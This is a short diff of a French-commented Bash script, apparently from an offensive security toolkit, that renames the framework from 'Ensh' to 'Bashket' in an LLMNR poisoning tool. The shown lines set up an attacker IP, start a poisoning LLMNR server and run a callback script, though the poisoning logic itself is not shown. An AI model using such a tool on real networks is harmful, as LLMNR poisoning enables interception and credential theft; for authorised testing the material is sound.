@@ -28,9 +28,9 @@
 set -uo pipefail
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-source "${SCRIPT_DIR}/../ensh.sh"
+source "${SCRIPT_DIR}/../bashket.sh"
 
-ensh::import protocol/llmnr/server
+bk::import protocol/llmnr/server
 
 # ── Parsing des arguments ─────────────────────────────────────────────────────
 
@@ -64,7 +64,7 @@ fi
 
 _banner() {
     printf '\n%s\n' "════════════════════════════════════════════════"
-    printf  ' Ensh — LLMNR Poisoning\n'
+    printf  ' Bashket — LLMNR Poisoning\n'
     printf  '%s\n' "════════════════════════════════════════════════"
     printf  '  Interface  : %s\n'   "${IFACE}"
     printf  '  Attaquant  : %s\n'   "${ATTACKER_IP}"
@@ -132,7 +132,7 @@ trap '_cleanup' EXIT INT TERM
 
 # ── Démarrage du serveur ──────────────────────────────────────────────────────
 
-export ENSH_LLMNR_PORT="${PORT}"
+export BK_LLMNR_PORT="${PORT}"
 
 _info "Démarrage du serveur LLMNR sur ${IFACE}:${PORT}..."
 if ! llmnr::server::start "${IFACE}" "${ATTACKER_IP}" "bash ${_CB_SCRIPT}"; then
